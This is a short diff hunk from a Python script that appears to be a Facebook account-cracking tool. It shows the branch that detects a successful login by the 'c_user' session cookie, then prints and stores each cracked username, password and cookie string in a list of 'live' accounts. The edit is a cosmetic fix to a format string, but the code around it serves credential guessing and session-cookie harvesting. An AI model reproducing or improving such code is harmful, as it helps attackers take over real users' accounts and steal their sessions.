@@ -572,7 +572,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {{H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
